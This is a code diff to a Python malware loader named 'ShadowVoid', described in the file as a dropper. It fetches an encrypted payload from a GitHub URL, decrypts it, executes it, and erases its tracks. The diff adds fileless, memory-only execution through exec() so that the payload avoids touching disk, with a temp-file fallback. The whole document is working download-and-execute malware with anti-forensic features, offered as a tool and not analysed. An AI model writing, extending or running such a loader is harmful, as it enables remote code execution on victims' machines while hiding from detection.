@@ -4,6 +4,7 @@
 ShadowVoid Loader v1.0.0-alpha
 Innocuous dropper - downloads and executes encrypted payload
 Zero footprint, self-destructing
+Memory-only execution mode
 """
 
 import sys
@@ -16,6 +17,7 @@ import platform
 import urllib.request
 import tempfile
 import ctypes
+from types import ModuleType
 
 try:
     if platform.system() == 'Linux':
@@ -29,8 +31,10 @@ except:
 CONFIG = {
     'payload_url': 'https://raw.githubusercontent.com/mraaisa-afk/shadow-void/main/core_encrypted.bin',
     'temp_dir': tempfile.gettempdir(),
-    'self_destruct': True
+    'self_destruct': True,
+    'memory_only': True
 }
+
 
 def scrub_tracks():
     try:
@@ -55,6 +59,7 @@ def scrub_tracks():
     except:
         pass
 
+
 def download_payload(url):
     try:
         req = urllib.request.Request(
@@ -68,6 +73,7 @@ def download_payload(url):
         scrub_tracks()
         sys.exit(1)
 
+
 def decrypt_payload(encrypted_data, key):
     try:
         from Crypto.Cipher import AES
@@ -79,13 +85,38 @@ def decrypt_payload(encrypted_data, key):
     except:
         return bytes([encrypted_data[i] ^ key[i % len(key)] for i in range(len(encrypted_data))])
 
+
 def get_key():
     return b'\x00' * 32
 
-def execute_payload(payload):
+
+def execute_in_memory(code_string, globals_dict=None):
+    """Execute Python code directly from memory without touching disk"""
     try:
-        exec(compile(payload.decode('utf-8'), '<string>', 'exec'))
+        if globals_dict is None:
+            globals_dict = {}
+        exec(compile(code_string, '<memory>', 'exec'), globals_dict)
+        return True
+    except Exception as e:
+        return False
+
+
+def execute_payload_memory(payload):
+    """Execute payload directly from memory"""
+    try:
+        payload_str = payload.decode('utf-8')
+        return execute_in_memory(payload_str)
     except:
+        return False
+
+
+def execute_payload(payload):
+    """Execute payload with memory-first approach"""
+    try:
+        if CONFIG.get('memory_only', True):
+            if execute_payload_memory(payload):
+                return True
+        # Fallback to temp file
         temp_file = os.path.join(CONFIG['temp_dir'], '.sv_temp')
         with open(temp_file, 'wb') as f:
             f.write(payload)
@@ -95,6 +126,10 @@ def execute_payload(payload):
             os.unlink(temp_file)
         except:
             pass
+        return True
+    except Exception as e:
+        return False
+
 
 def main():
     try:
@@ -106,6 +141,7 @@ def main():
         print(f"Loader failed: {e}")
     finally:
         scrub_tracks()
+
 
 if __name__ == '__main__':
     main()
